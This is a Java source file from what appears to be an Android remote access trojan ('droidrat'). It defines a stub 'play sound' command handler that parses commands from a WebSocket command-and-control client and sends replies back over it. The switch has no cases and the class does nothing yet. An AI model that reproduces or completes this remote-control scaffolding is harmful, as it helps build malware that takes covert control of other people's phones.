package com.je_chen.droidrat_je.rat.command;

import com.je_chen.droidrat_je.rat.command.process_super.CommandFather;
import com.je_chen.droidrat_je.rat.modules.appintent.play.Play;

import static com.je_chen.droidrat_je.service.command.ProcessCommandService.droidRatWebSocketClient;

/**
 * TODO play sound
 */

public class PlayCommand extends CommandFather {

    private Play play;

    public PlayCommand() {
        play = new Play();
    }

    @Override
    public void send(String value) {
        droidRatWebSocketClient.send(value);
    }

    @Override
    public void processCommand(String command) {
        try {
            String[] rawCommandArray = command.split(" ");
            switch (rawCommandArray[1]) {

            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
